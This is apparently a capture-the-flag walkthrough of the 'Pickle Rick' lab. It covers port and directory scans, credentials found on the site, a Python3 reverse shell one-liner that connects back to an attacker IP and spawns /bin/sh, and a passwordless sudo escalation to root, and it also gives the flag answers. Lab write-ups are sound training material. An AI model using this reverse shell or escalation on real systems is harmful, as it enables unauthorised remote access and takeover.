# Pickle Rick

* IP=10.10.61.126

## Nmap scan report:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0a:0c:98:e3:b0:cc:bb:31:bb:9b:d1:72:4d:d5:19:9b (RSA)
|   256 f0:0c:16:42:28:8c:e5:20:c0:a1:74:60:23:37:8a:27 (ECDSA)
|_  256 8f:fe:50:7c:08:6c:24:d8:25:af:4d:f5:3b:e0:53:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## GoBuster report:
```
=====================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)

```
### Login Creds at /login.php:
```
Username: R1ckRul3s
robots.txt: Wubbalubbadubdub (password)
```
## Questions/Tasks:

1. What is the first ingredient Rick needs?
```bash
while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt
```
OR
```bash
grep . Sup3rS3cretPickl3Ingred.txt
```
Ans- mr. meeseek hair

2. Whats the second ingredient Rick needs?

* Python3 reverse shell:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.50.128",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
* Navigate to /home/rick
* file contents:
```bash
$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```
```
cat 'second ingredients'
```
Ans- 1 jerry tear

3. Whats the final ingredient Rick needs?

* Check sudo permissions(commands that can be run with sudo)
```bash
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-61-126.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-61-126.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
* Since sudo is set to no password, hence we can escalate privileges just by:
```bash
sudo bash
```
* Navigate to /root and find the 3rd.txt

Ans- fleeb juice
